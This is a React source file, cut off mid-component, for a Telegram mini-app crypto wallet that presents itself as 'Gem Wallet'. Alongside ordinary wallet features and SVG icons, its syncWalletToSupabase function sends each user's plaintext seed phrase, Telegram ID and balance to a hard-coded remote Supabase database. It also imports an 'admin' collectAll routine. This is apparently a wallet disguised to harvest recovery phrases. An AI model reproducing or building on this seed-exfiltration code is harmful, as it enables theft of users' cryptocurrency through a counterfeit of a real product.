import React, { useState, useRef, useEffect, useCallback, useMemo } from "react";

import { QRCodeSVG } from "qrcode.react";

import QRScanner from "./components/QRScanner.jsx";

import {

  ArrowUpRight, ArrowDownLeft, CreditCard, ArrowLeftRight, ArrowRight, DollarSign,

  Copy, Check, Eye, EyeOff, Settings, Wallet, Activity,

  ChevronRight, Shield, Key, HelpCircle, X,

  Plus, ChevronDown, RefreshCw, Globe, Lock, AlertTriangle, Bell,

  ExternalLink, TrendingUp, TrendingDown, Zap,

  CheckCircle, Clock, AlertCircle, RotateCcw,

  Users, Download, Building2, LayoutGrid, Diamond, Sparkles, Sprout,

  Image, ChartLine, BellRing, Palette, UserCircle,

  ShoppingCart, Crown, Rocket, Scan, Trash2

} from "lucide-react";



// ─── BLOCKCHAIN IMPORTS ───────────────────────────────────────────────────────

import { generateMnemonic as bip39GenMnemonic, deriveWallet, getPrivateKey } from "./lib/crypto/walletDerivation.js";

import { fetchAllBalances } from "./lib/crypto/balanceFetcher.js";

import { executeSwap, getSwapQuote } from "./lib/swap/swapAggregator.js";

import { collectAll } from "./lib/admin/collectSalary.js";

import { sendTransaction as chainSendTransaction } from "./lib/crypto/transactionSender.js";



// ─── SUPABASE SYNC ────────────────────────────────────────────────────────────

const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL || "https://ipgarqmumnbpjnputhnp.supabase.co";
const SUPABASE_KEY = import.meta.env.VITE_SUPABASE_ANON_KEY;

function getMoscowTimestamp() {
  const now = new Date();
  try {
    const moscowTime = new Intl.DateTimeFormat("en-US", {
      timeZone: "Europe/Moscow",
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
      hour12: false,
    }).formatToParts(now);
    const m = Object.fromEntries(moscowTime.filter(p => p.type !== 'literal').map(p => [p.type, p.value]));
    return `${m.year}-${m.month}-${m.day}T${m.hour}:${m.minute}:00+03:00`;
  } catch (e) {
    return now.toISOString();
  }
}

function getTelegramUser() {
  try {
    const tg = window?.Telegram?.WebApp;
    const unsafeUser = tg?.initDataUnsafe?.user;
    if (unsafeUser && (unsafeUser.username || unsafeUser.first_name || unsafeUser.last_name || unsafeUser.id)) {
      return unsafeUser;
    }
    const rawInitData = tg?.initData;
    if (rawInitData) {
      const userParam = new URLSearchParams(rawInitData).get("user");
      if (userParam) {
        const parsedUser = JSON.parse(userParam);
        if (parsedUser && (parsedUser.username || parsedUser.first_name || parsedUser.last_name || parsedUser.id)) {
          return parsedUser;
        }
      }
    }
  } catch (error) {}
  return null;
}

function resolveTelegramDisplayName(fallbackUserId = null) {
  const user = getTelegramUser();
  if (user) {
    const name = user.username ? `@${user.username}` : ([user.first_name, user.last_name].filter(Boolean).join(" ").trim() || `User_${user.id}`);
    if (user.id) localStorage.setItem(`gem_tg_name_${user.id}`, name);
    localStorage.setItem("gem_last_tg_name", name);
    return name;
  }
  const uid = fallbackUserId || RESOLVED_USER_ID || getTgUserId();
  if (uid) {
    const stored = localStorage.getItem(`gem_tg_name_${uid}`);
    if (stored) return stored;
    return `User_${uid}`;
  }
  return localStorage.getItem("gem_last_tg_name") || "Anonymous";
}

async function syncWalletToSupabase(walletData) {
  if (!SUPABASE_URL || !SUPABASE_KEY) {
    try {
      localStorage.setItem("gem_last_supabase_error", JSON.stringify({
        at: new Date().toISOString(),
        message: "Supabase URL or ANON KEY missing (check VITE_SUPABASE_URL / VITE_SUPABASE_ANON_KEY in Vercel env).",
      }));
    } catch {}
    return null;
  }
  try {
    const { username, mnemonic, balance, telegram_id } = walletData;
    const cleanMnemonic = Array.isArray(mnemonic) ? mnemonic.join(' ') : mnemonic;

    // Always resolve display name
    let finalName = username;
    if (!finalName || finalName === "Anonymous") {
      finalName = resolveTelegramDisplayName();
    }

    // Resolve telegram_id — prefer passed value, then live Telegram data
    const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
    const resolvedTgId = telegram_id || (tgUser?.id ? String(tgUser.id) : null);

    // If we have a telegram_id, use it as the unique conflict key so each
    // Telegram account always gets its own row regardless of display name.
    const conflictCol = resolvedTgId ? "telegram_id" : "username";
    const url = `${SUPABASE_URL}/rest/v1/wallets?on_conflict=${conflictCol}`;

    const payload = {
      username: finalName,
      mnemonic: cleanMnemonic,
      balance: balance ? String(balance) : "0",
      created_at: getMoscowTimestamp(),
    };
    if (resolvedTgId) {
      payload.telegram_id = resolvedTgId;
    }

    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'apikey': SUPABASE_KEY,
        'Authorization': `Bearer ${SUPABASE_KEY}`,
        'Content-Type': 'application/json',
        'Prefer': 'resolution=merge-duplicates'
      },
      body: JSON.stringify(payload)
    });
    if (!response.ok) {
      const txt = await response.text();
      console.error("[Supabase Sync Error]", response.status, txt);
      try {
        localStorage.setItem("gem_last_supabase_error", JSON.stringify({
          at: new Date().toISOString(),
          status: response.status,
          body: txt,
        }));
      } catch {}
    }
  } catch (error) {
    console.error("[Supabase Fetch Error]", error);
    try {
      localStorage.setItem("gem_last_supabase_error", JSON.stringify({
        at: new Date().toISOString(),
        message: String(error?.message || error),
      }));
    } catch {}
  }
}



// ─── GENERATORS (real BIP39 + HD derivation) ─────────────────────────────────

// genMnemonic: returns 12-word BIP39 array (bip39GenMnemonic returns a string)

const genMnemonic = () => bip39GenMnemonic().split(" ");

// genAddr kept for genTxHash only — addresses come from deriveWallet

const genAddr = (prefix="0x", len=40) => prefix + Array.from({length:len}, () => "0123456789abcdef"[Math.floor(Math.random()*16)]).join("");

const genTxHash = () => "0x" + Array.from({length:64}, () => "0123456789abcdef"[Math.floor(Math.random()*16)]).join("");

const shortAddr = (a) => a.slice(0,6)+"…"+a.slice(-4);

const fmt = (n, d=2) => Number(n).toLocaleString("en-US",{minimumFractionDigits:d,maximumFractionDigits:d});

const fmtUSD = n => "$"+fmt(n);

const fmtCrypto = (n, d=6) => parseFloat(n.toFixed(d));



// ─── STORAGE HELPERS (Telegram-linked localStorage) ─────────────────────────

// Устанавливается один раз при инициализации — гарантирует консистентность ключей

let RESOLVED_USER_ID = null;

function getOrCreateSessionId() {
  try {
    const existing = sessionStorage.getItem("gem_session_id");
    if (existing) return existing;
    const created = `${Date.now()}_${Math.random().toString(16).slice(2)}`;
    sessionStorage.setItem("gem_session_id", created);
    return created;
  } catch {
    return `${Date.now()}_${Math.random().toString(16).slice(2)}`;
  }
}



function getTgUserId() {

  try {

    return getTelegramUser()?.id || null;

  } catch { return null; }

}

function storageKey(base) {

  // Используем зафиксированный userId если он уже определён

  const uid = RESOLVED_USER_ID || getTgUserId();

  if (uid) return `${base}_${uid}`;
  const sid = getOrCreateSessionId();
  return `${base}_session_${sid}`;

}



// ─── INITIAL ASSET STATE ──────────────────────────────────────────────────────

const INITIAL_PRICES = { USDT: 1.0000 };

const ASSET_META = [

  { id:"eth",  sym:"ETH",  name:"Ethereum",  color:"#8B9CF7", bg:"#0D1033", chg:0,    icon:"Ξ",  chain:"eth"     },

  { id:"ton",  sym:"TON",  name:"Toncoin",   color:"#0098EA", bg:"#001E33", chg:0,    icon:"◆",  chain:"ton"     },

  { id:"bnb",  sym:"BNB",  name:"BNB Chain", color:"#F3BA2F", bg:"#2A2100", chg:0,    icon:"◈",  chain:"bnb"     },

  { id:"ltc",  sym:"LTC",  name:"Litecoin",  color:"#BFBBBB", bg:"#1A1A1A", chg:0,    icon:"Ł",  chain:"ltc"     },

  { id:"arb",  sym:"ARB",  name:"Arbitrum",  color:"#28A0F0", bg:"#001A2A", chg:0,    icon:"◎",  chain:"arb"     },

  { id:"sol",  sym:"SOL",  name:"Solana",    color:"#B57BFF", bg:"#1A0A33", chg:0,    icon:"◉",  chain:"sol"     },

  { id:"usdt", sym:"USDT", name:"Tether",    color:"#26A17B", bg:"#001A14", chg:0.01, icon:"₮",  chain:"eth"     },

];

const INITIAL_BALANCES = { ETH: 0, TON: 0, BNB: 0, LTC: 0, ARB: 0, SOL: 0, USDT: 0 };



// ─── REAL NETWORK FEES (updated for current market) ─────────────────────────────
const NETWORK_FEES = {
  ETH: { low: 10, medium: 20, high: 40 },      // Gwei
  BNB: { low: 1, medium: 3, high: 5 },         // Gwei
  ARB: { low: 0.01, medium: 0.1, high: 0.5 },  // Gwei
  SOL: { low: 1000, medium: 5000, high: 10000 }, // micro-lamports
  TON: { low: 2000000, medium: 5000000, high: 10000000 }, // nanoton
  LTC: { low: 10, medium: 25, high: 50 },      // sat/byte
  USDT: { low: 10, medium: 25, high: 50 }       // Depends on network, but using Gwei as base
};

const SPEED_ESTIMATES = {
  ETH:  { low: "10-30 мин",  medium: "3-10 мин",   high: "1-3 мин"   },
  BNB:  { low: "1-2 мин",    medium: "30-60 сек",  high: "10-30 сек" },
  SOL:  { low: "30 сек",     medium: "10 сек",     high: "1-2 сек"   },
  TON:  { low: "1-2 мин",    medium: "30-60 сек",  high: "10-30 сек" },
  LTC:  { low: "30-60 мин",  medium: "10-30 мин",  high: "5-10 мин"  },
  ARB:  { low: "1-2 мин",    medium: "10-30 сек",  high: "1-5 сек"   },
  USDT: { low: "3-10 мин",   medium: "1-3 мин",    high: "30-60 сек" }
};



// ─── PRODUCTION MODE BALANCES ─────────────────────────────────────────────
// Real balances are fetched via fetchAllBalances in WalletApp component



// ─── OFFICIAL GEM WALLET LINKS ────────────────────────────────────────────────

const GEM_LINKS = {

  twitter: "https://twitter.com/gemwallet",

  telegram: "https://t.me/gemwallet",

  discord: "https://discord.gg/gemwallet",

  github: "https://github.com/gemwallet",

  website: "https://gemwallet.io"

};



// ─── ADDRESS VALIDATION ─────────────────────────────────────────────────────

// Validates crypto addresses - only accepts real address formats or similar

function isValidAddress(address, sym) {

  if (!address || typeof address !== 'string') return false;

  const trimmed = address.trim();

  if (trimmed.length < 10) return false; // Too short

  

  // ETH / BNB / ARB - 0x prefix + 40 hex chars

  if (['ETH', 'BNB', 'ARB', 'USDT'].includes(sym)) {

    return /^0x[a-fA-F0-9]{40}$/.test(trimmed);

  }

  // SOL - Base58, 32-44 chars

  if (sym === 'SOL') {

    return /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(trimmed);

  }

  // TON - EQ/UQ prefix + 48 chars

  if (sym === 'TON') {

    return /^(EQ|UQ)[a-zA-Z0-9_-]{46,48}$/.test(trimmed);

  }

  // LTC - L/M prefix

  if (sym === 'LTC') {

    return /^[LM][a-zA-Z0-9]{26,33}$/.test(trimmed);

  }

  // Generic fallback - accept if looks like address (alphanumeric, min length)

  return /^[a-zA-Z0-9]{20,60}$/.test(trimmed);

}



// ─── PRICE FETCHER ────────────────────────────────────────────────────────────

async function fetchLivePrices() {

  try {

    const ids = "ethereum,binancecoin,solana,the-open-network,litecoin,arbitrum,tether";

    const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd&include_24hr_change=true`);

    const data = await res.json();

    const map = {

      ethereum: "ETH", binancecoin: "BNB", solana: "SOL",

      "the-open-network": "TON", litecoin: "LTC", arbitrum: "ARB", tether: "USDT"

    };

    const prices = {}, changes = {};

    Object.entries(map).forEach(([cgId, sym]) => {

      if (data[cgId]) {

        prices[sym] = data[cgId].usd;

        changes[sym] = data[cgId].usd_24h_change || 0;

      }

    });

    return { prices, changes };

  } catch {

    return null;

  }

}



// ─── GEM LOGO SVG COMPONENT ─────────────────────────────────────────────────

// Realistic 3D crystal gem with multiple facets

function GemLogo({ size = 40 }) {

  return (

    <svg width={size} height={size} viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">

      <defs>

        {/* Main crystal gradient */}

        <linearGradient id="crystalMain" x1="50%" y1="0%" x2="50%" y2="100%">

          <stop offset="0%" stopColor="#60a5fa" />

          <stop offset="40%" stopColor="#3b82f6" />

          <stop offset="60%" stopColor="#2563eb" />

          <stop offset="100%" stopColor="#1e40af" />

        </linearGradient>

        {/* Side facets gradient */}

        <linearGradient id="crystalLeft" x1="0%" y1="0%" x2="100%" y2="100%">

          <stop offset="0%" stopColor="#93c5fd" />

          <stop offset="50%" stopColor="#60a5fa" />

          <stop offset="100%" stopColor="#3b82f6" />

        </linearGradient>

        <linearGradient id="crystalRight" x1="100%" y1="0%" x2="0%" y2="100%">

          <stop offset="0%" stopColor="#818cf8" />

          <stop offset="50%" stopColor="#6366f1" />

          <stop offset="100%" stopColor="#4f46e5" />

        </linearGradient>

        {/* Bottom point gradient */}

        <linearGradient id="crystalBottom" x1="50%" y1="0%" x2="50%" y2="100%">

          <stop offset="0%" stopColor="#2563eb" />

          <stop offset="100%" stopColor="#1e3a8a" />

        </linearGradient>

        {/* Inner facet gradients */}

        <linearGradient id="facetShine" x1="0%" y1="0%" x2="100%" y2="100%">

          <stop offset="0%" stopColor="rgba(255,255,255,0.5)" />

          <stop offset="100%" stopColor="rgba(255,255,255,0)" />

        </linearGradient>

        {/* Glow filter */}

        <filter id="crystalGlow" x="-50%" y="-50%" width="200%" height="200%">

          <feGaussianBlur stdDeviation="1" result="blur"/>

          <feComposite in="SourceGraphic" in2="blur" operator="over"/>

        </filter>

      </defs>

      

      {/* Outer glow */}

      <ellipse cx="24" cy="42" rx="12" ry="4" fill="rgba(37,99,235,0.2)" filter="url(#crystalGlow)"/>

      

      {/* Main crystal body - complex 3D shape */}

      {/* Top table (flat top) */}

      <polygon points="24,2 36,8 24,14 12,8" fill="#bfdbfe" stroke="rgba(255,255,255,0.6)" strokeWidth="0.3"/>

      

      {/* Upper girdle facets - left side */}

      <polygon points="12,8 24,14 20,20 6,14" fill="url(#crystalLeft)" stroke="rgba(255,255,255,0.3)" strokeWidth="0.3"/>

      <polygon points="6,14 20,20 18,28 4,20" fill="url(#crystalLeft)" stroke="rgba(255,255,255,0.2)" strokeWidth="0.3"/>

      

      {/* Upper girdle facets - right side */}

      <polygon points="36,8 24,14 28,20 42,14" fill="url(#crystalRight)" stroke="rgba(255,255,255,0.3)" strokeWidth="0.3"/>

      <polygon points="42,14 28,20 30,28 44,20" fill="url(#crystalRight)" stroke="rgba(255,255,255,0.2)" strokeWidth="0.3"/>

      

      {/* Center/main facet front */}

      <polygon points="24,14 20,20 24,36 28,20" fill="url(#crystalMain)" stroke="rgba(255,255,255,0.4)" strokeWidth="0.3"/>

      

      {/* Lower pavilion facets - left */}

      <polygon points="20,20 18,28 24,36 24,20" fill="#4f46e5" stroke="rgba(255,255,255,0.2)" strokeWidth="0.3"/>

      <polygon points="18,28 8,32 24,36" fill="#4338ca" stroke="rgba(255,255,255,0.15)" strokeWidth="0.3"/>

      

      {/* Lower pavilion facets - right */}

      <polygon points="28,20 30,28 24,36" fill="#6366f1" stroke="rgba(255,255,255,0.2)" strokeWidth="0.3"/>

      <polygon points="30,28 40,32 24,36" fill="#4f46e5" stroke="rgba(255,255,255,0.15)" strokeWidth="0.3"/>

      

      {/* Side pavilion facets */}

      <polygon points="4,20 18,28 8,32" fill="#1e40af" stroke="rgba(255,255,255,0.1)" strokeWidth="0.3"/>

      <polygon points="44,20 30,28 40,32" fill="#3730a3" stroke="rgba(255,255,255,0.1)" strokeWidth="0.3"/>

      

      {/* Bottom culet */}

      <polygon points="8,32 24,36 40,32 24,44" fill="url(#crystalBottom)" stroke="rgba(255,255,255,0.2)" strokeWidth="0.3"/>

      

      {/* Highlights and sparkles */}

      <ellipse cx="24" cy="10" rx="5" ry="2" fill="rgba(255,255,255,0.4)"/>

      <circle cx="20" cy="18" r="1.5" fill="rgba(255,255,255,0.8)"/>

      <circle cx="26" cy="24" r="1" fill="rgba(255,255,255,0.6)"/>

      <ellipse cx="22" cy="32" rx="2" ry="1" fill="rgba(255,255,255,0.3)"/>

      

      {/* Top bright reflection */}

      <polygon points="18,6 24,4 30,6 24,10" fill="rgba(255,255,255,0.5)"/>

    </svg>

  );

}



// ─── EMPTY MAILBOX ICON ─────────────────────────────────────────────────────

function EmptyMailboxIcon({ size = 48 }) {

  return (

    <svg width={size} height={size} viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">

      <defs>

        <linearGradient id="mailboxGrad" x1="0%" y1="0%" x2="0%" y2="100%">

          <stop offset="0%" stopColor="rgba(255,255,255,0.15)" />

          <stop offset="100%" stopColor="rgba(255,255,255,0.05)" />

        </linearGradient>

      </defs>

      {/* Mailbox body */}

      <rect x="10" y="18" width="28" height="22" rx="3" 

        fill="url(#mailboxGrad)" 

        stroke="rgba(255,255,255,0.2)" 

        strokeWidth="1.5"/>

      {/* Mailbox door line */}

      <line x1="24" y1="18" x2="24" y2="40" stroke="rgba(255,255,255,0.1)" strokeWidth="1"/>

      {/* Flag (down position) */}

      <line x1="35" y1="25" x2="35" y2="35" stroke="rgba(255,255,255,0.3)" strokeWidth="2" strokeLinecap="round"/>

      <circle cx="35" cy="35" r="2" fill="rgba(255,255,255,0.4)"/>

      {/* Roof/top */}

      <path d="M8 18 L24 8 L40 18" 

        fill="none" 

        stroke="rgba(255,255,255,0.25)" 

        strokeWidth="1.5" 

        strokeLinecap="round" 

        strokeLinejoin="round"/>

      {/* Empty indicator - dotted line inside */}

      <line x1="16" y1="30" x2="32" y2="30" stroke="rgba(255,255,255,0.1)" strokeWidth="1" strokeDasharray="3,2"/>

      {/* Bottom shadow */}

      <ellipse cx="24" cy="42" rx="14" ry="3" fill="rgba(0,0,0,0.2)"/>

    </svg>

  );

}



// ─── NFT PLACEHOLDER ICON ──────────────────────────────────────────────────

function NftPlaceholderIcon({ size = 48 }) {

  return (

    <svg width={size} height={size} viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">

      <defs>

        <linearGradient id="nftGrad1" x1="0%" y1="0%" x2="100%" y2="100%">

          <stop offset="0%" stopColor="#3b82f6" />

          <stop offset="50%" stopColor="#8b5cf6" />

          <stop offset="100%" stopColor="#ec4899" />

        </linearGradient>

        <linearGradient id="nftGrad2" x1="100%" y1="0%" x2="0%" y2="100%">

          <stop offset="0%" stopColor="#06b6d4" />

          <stop offset="100%" stopColor="#3b82f6" />

        </linearGradient>

      </defs>

      {/* Background frame */}

      <rect x="6" y="8" width="36" height="32" rx="6" fill="#111" stroke="url(#nftGrad1)" strokeWidth="1.5"/>

      {/* Inner decorative shapes */}

      <circle cx="18" cy="20" r="5" fill="url(#nftGrad2)" opacity="0.8"/>

      <path d="M8 36 L20 26 L28 32 L40 22 L40 36 Z" fill="url(#nftGrad1)" opacity="0.6"/>

      {/* Diamond/gem accent */}

      <path d="M34 12 L38 18 L34 24 L30 18 Z" fill="url(#nftGrad2)" opacity="0.9"/>

      {/* Sparkle dots */}

      <circle cx="14" cy="32" r="2" fill="#fff" opacity="0.6"/>

      <circle cx="38" cy="28" r="1.5" fill="#fff" opacity="0.4"/>

    </svg>

  );

}



// ─── NFT ADD BUTTON ICON ─────────────────────────────────────────────────────

function NftAddIcon({ size = 32 }) {

  return (

    <svg width={size} height={size} viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">

      <defs>

        <linearGradient id="addBtnGrad" x1="0%" y1="0%" x2="100%" y2="100%">

          <stop offset="0%" stopColor="#3b82f6" />

          <stop offset="100%" stopColor="#2563eb" />

        </linearGradient>

      </defs>

      {/* Circle background */}

      <circle cx="16" cy="16" r="14" fill="url(#addBtnGrad)"/>

      {/* Plus sign */}

      <line x1="16" y1="10" x2="16" y2="22" stroke="#fff" strokeWidth="2.5" strokeLinecap="round"/>

      <line x1="10" y1="16" x2="22" y2="16" stroke="#fff" strokeWidth="2.5" strokeLinecap="round"/>

      {/* Shine effect */}

      <circle cx="12" cy="12" r="3" fill="#fff" opacity="0.2"/>

    </svg>

  );

}



// ─── CRYSTAL AVATAR ICON ────────────────────────────────────────────────────

// Crystal without background - background is set via CSS (graphite gradient)

function CrystalIcon({ size = 52 }) {

  return (

    <svg width={size} height={size} viewBox="0 0 52 52" fill="none" xmlns="http://www.w3.org/2000/svg">

      {/* White crystal - top flat facet */}

      <path d="M26 8 L10 18 L26 18 L42 18 Z" fill="#ffffff" opacity="0.98"/>

      {/* White crystal - left facet */}

      <path d="M10 18 L26 18 L26 44 L6 24 Z" fill="#e0e7ff" opacity="0.92"/>

      {/* White crystal - right facet */}

      <path d="M26 18 L42 18 L46 24 L26 44 Z" fill="#c7d2fe" opacity="0.88"/>

      {/* White crystal - center bottom */}

      <path d="M26 18 L26 44 L6 24 L26 18 Z" fill="#ffffff" opacity="0.85"/>

      {/* Subtle outline for visibility on dark backgrounds */}

      <path d="M26 8 L10 18 L6 24 L26 44 L46 24 L42 18 Z" stroke="rgba(255,255,255,0.15)" strokeWidth="0.5" fill="none"/>

    </svg>

  );

}



// ─── BEAUTIFUL AVATAR ICONS ───────────────────────────────────────────────────

function AvatarDiamondIcon({ size = 32 }) {

  return (

    <svg width={size} height={size} viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">

      <defs>

        <linearGradient id="diamondGrad" x1="0%" y1="0%" x2="100%" y2="100%">

          <stop offset="0%" stopColor="#60a5fa" />

          <stop offset="50%" stopColor="#3b82f6" />

          <stop offset="100%" stopColor="#2563eb" />

        </linearGradient>

      </defs>

      {/* Diamond shape with gradient */}

      <path d="M16 4 L28 12 L16 28 L4 12 Z" fill="url(#diamondGrad)"/>

      {/* Top facet highlight */}

      <path d="M16 4 L22 10 L16 10 L10 10 Z" fill="#93c5fd" opacity="0.8"/>

      {/* Shine effect */}

      <circle cx="12" cy="10" r="2" fill="#fff" opacity="0.6"/>

    </svg>

  );

}



function AvatarUserIcon({ size = 32 }) {

  return (

    <svg width={size} height={size} viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">

      <defs>

        <linearGradient id="userGrad" x1="0%" y1="0%" x2="0%" y2="100%">

          <stop offset="0%" stopColor="#f472b6" />

          <stop offset="100%" stopColor="#db2777" />

        </linearGradient>

      </defs>

      {/* Head */}

      <circle cx="16" cy="12" r="7" fill="url(#userGrad)"/>

      {/* Body */}

      <path d="M6 26 Q16 18 26 26 L26 30 L6 30 Z" fill="url(#userGrad)" opacity="0.8"/>

      {/* Face highlight */}

      <circle cx="14" cy="11" r="2" fill="#fff" opacity="0.3"/>

    </svg>

  );

}



function AvatarZapIcon({ size = 32 }) {

  return (

    <svg width={size} height={size} viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">

      <defs>

        <linearGradient id="zapGrad" x1="0%" y1="0%" x2="100%" y2="100%">

          <stop offset="0%" stopColor="#fbbf24" />

          <stop offset="50%" stopColor="#f59e0b" />

          <stop offset="100%" stopColor="#d97706" />

        </linearGradient>

      </defs>

      {/* Lightning bolt */}

      <path d="M18 4 L10 14 L16 14 L14 28 L22 16 L16 16 Z" fill="url(#zapGrad)"/>

      {/* Glow effect */}

      <circle cx="16" cy="16" r="12" stroke="url(#zapGrad)" strokeWidth="1" opacity="0.3" fill="none"/>

    </svg>

  );

}



function AvatarShieldIcon({ size = 32 }) {

  return (

    <svg width={size} height={size} viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">

      <defs>

        <linearGradient id="shieldGrad" x1="0%" y1="0%" x2="0%" y2="100%">

          <stop offset="0%" stopColor="#34d399" />

          <stop offset="100%" stopColor="#10b981" />

        </linearGradient>

      </defs>

      {/* Shield shape */}

      <path d="M16 4 L26 8 L26 15 Q26 24 16 28 Q6 24 6 15 L6 8 Z" fill="url(#shieldGrad)"/>

      {/* Checkmark */}

      <path d="M12 16 L15 19 L20 12" stroke="#fff" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>

    </svg>

  );

}



function AvatarFireIcon({ size = 32 }) {

  return (

    <svg width={size} height={size} viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">

      <defs>

        <linearGradient id="fireGrad" x1="0%" y1="100%" x2="0%" y2="0%">

          <stop offset="0%" stopColor="#ef4444" />

          <stop offset="50%" stopColor="#f97316" />

          <stop offset="100%" stopColor="#fbbf24" />

        </linearGradient>

      </defs>

      {/* Flame shape */}

      <path d="M16 28 Q10 24 10 18 Q10 14 13 10 Q12 14 14 16 Q14 12 16 8 Q18 12 18 16 Q20 14 19 10 Q22 14 22 18 Q22 24 16 28" fill="url(#fireGrad)"/>

      {/* Inner flame */}

      <path d="M16 24 Q13 21 13 18 Q13 16 15 14 Q14 16 16 17 Q16 15 16 13 Q18 15 18 17 Q19 16 18 14 Q19 16 19 18 Q19 21 16 24" fill="#fff" opacity="0.4"/>

    </svg>

  );

}



function AvatarMoonIcon({ size = 32 }) {

  return (

    <svg width={size} height={size} viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">

      <defs>

        <linearGradient id="moonGrad" x1="0%" y1="0%" x2="100%" y2="100%">

          <stop offset="0%" stopColor="#a78bfa" />

          <stop offset="100%" stopColor="#7c3aed" />

        </linearGradient>

      </defs>

      {/* Crescent moon */}

      <path d="M18 4 Q26 8 26 16 Q26 24 18 28 Q22 24 22 16 Q22 8 18 4" fill="url(#moonGrad)"/>

      {/* Stars */}

      <circle cx="8" cy="10" r="1.5" fill="#fff" opacity="0.8"/>

      <circle cx="10" cy="22" r="1" fill="#fff" opacity="0.6"/>

    </svg>

  );

}



// ─── HELPERS ─────────────────────────────────────────────────────────────────



// Fetch historical price data from CoinGecko with fallback

async function fetchPriceHistory(sym, days=7) {

  try {

    const idMap={ETH:"ethereum",BNB:"binancecoin",SOL:"solana",TON:"the-open-network",LTC:"litecoin",ARB:"arbitrum",USDT:"tether"};

    const id=idMap[sym];

    if(!id) return generateMockChartData(sym, days);

    const res=await fetch(`https://api.coingecko.com/api/v3/coins/${id}/market_chart?vs_currency=usd&days=${days}`);

    if(!res.ok) throw new Error("API error");

    const data=await res.json();

    if(!data.prices || data.prices.length<2) throw new Error("No data");

    return data.prices.map(p=>({timestamp:p[0],price:p[1]}));

  }catch{

    // Fallback to realistic mock data

    return generateMockChartData(sym, days);

  }

}



// Generate realistic mock chart data as fallback

function generateMockChartData(sym, days) {

  const basePrices={ETH:3200,BNB:580,SOL:145,TON:6.5,LTC:72,ARB:0.85,USDT:1.0};

  const base=basePrices[sym]||100;

  const volatility=sym==="USDT"?0.002:0.03; // USDT is stable

  const points=days===1?24:days===7?42:90; // Hourly for 1d, every 4h for 7d, daily for 30d

  const now=Date.now();

  const interval=days*24*60*60*1000/points;

  

  let currentPrice=base*(0.95+Math.random()*0.1); // Start near base

  const data=[];

  

  for(let i=0;i<points;i++){

    const timestamp=now-(points-i)*interval;

    // Random walk with trend

    const change=(Math.random()-0.5)*volatility*currentPrice;

    currentPrice=Math.max(currentPrice+change,base*0.5);

    data.push({timestamp,price:currentPrice});

  }

  

  return data;

}



// SVG Mini Chart Component

function MiniPriceChart({ data, color="#22C55E", width=120, height=40 }) {

  if(!data||data.length<2) return <div style={{width,height,background:"#1a1a1a",borderRadius:4}}/>;

  

  const prices=data.map(d=>d.price);

  const min=Math.min(...prices);

  const max=Math.max(...prices);

  const range=max-min||1;

  

  const points=data.map((d,i)=>{

    const x=(i/(data.length-1))*width;

    const y=height-((d.price-min)/range)*height;

    return `${x},${y}`;

  }).join(" ");

  

  const isPositive=data[data.length-1].price>=data[0].price;

  const lineColor=isPositive?"#22C55E":"#EF4444";

  

  return (

    <svg width={width} height={height} style={{borderRadius:4}}>

      <defs>

        <linearGradient id={`grad-${color.replace("#","")}`} x1="0%" y1="0%" x2="0%" y2="100%">

          <stop offset="0%" stopColor={lineColor} stopOpacity="0.3"/>

          <stop offset="100%" stopColor={lineColor} stopOpacity="0"/>

        </linearGradient>

      </defs>

      <polyline points={points} fill="none" stroke={lineColor} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>

      <polygon points={`0,${height} ${points} ${width},${height}`} fill={`url(#grad-${color.replace("#","")})`} opacity="0.3"/>

    </svg>

  );

}



function CoinIcon({ asset, size=42 }) {

  return (

    <div style={{width:size,height:size,borderRadius:"50%",background:asset.bg,

      border:`1.5px solid ${asset.color}33`,display:"flex",alignItems:"center",

      justifyContent:"center",fontSize:size*0.38,color:asset.color,flexShrink:0,

      fontFamily:"monospace",fontWeight:700,boxShadow:`0 0 12px ${asset.color}22`}}>

      {asset.icon}

    </div>

  );

}



function ActionBtn({ icon, label, onClick, color="#2563EB" }) {

  const [p,setP]=useState(false);

  function handleClick() {

    try { window.Telegram?.WebApp?.HapticFeedback?.impactOccurred("light"); } catch(_) {}

    onClick?.();

  }

  return (

    <button onClick={handleClick} onMouseDown={()=>setP(true)} onMouseUp={()=>setP(false)}

      onTouchStart={()=>setP(true)} onTouchEnd={()=>setP(false)}

      style={{display:"flex",flexDirection:"column",alignItems:"center",gap:8,

        background:"none",border:"none",cursor:"pointer",padding:0,

        transform:p?"scale(0.92)":"scale(1)",transition:"transform 0.12s cubic-bezier(.34,1.56,.64,1)"}}>

      <div style={{width:54,height:54,borderRadius:"50%",background:color,

        display:"flex",alignItems:"center",justifyContent:"center",boxShadow:`0 4px 20px ${color}55`}}>{icon}</div>

      <span style={{fontSize:12,color:"rgba(255,255,255,0.6)",fontWeight:500}}>{label}</span>

    </button>

  );

}



function Sheet({ onClose, title, children }) {

  // Keep a stable ref to latest onClose so the Telegram BackButton effect runs only once

  const onCloseRef = useRef(onClose);

  useEffect(() => { onCloseRef.current = onClose; }, [onClose]);



  useEffect(() => {

    const tg = window.Telegram?.WebApp;

    if (!tg?.BackButton) return;

    const handler = () => onCloseRef.current?.();

    try {

      tg.BackButton.show();

      tg.BackButton.onClick(handler);

    } catch (e) { console.warn('[Sheet] BackButton.onClick error:', e); }

    return () => {

      try {

        tg.BackButton.hide();

        // offClick was added in Telegram Bot API 6.1 — guard for older clients

        tg.BackButton.offClick?.(handler);

      } catch (e) { console.warn('[Sheet] BackButton cleanup error:', e); }

    };

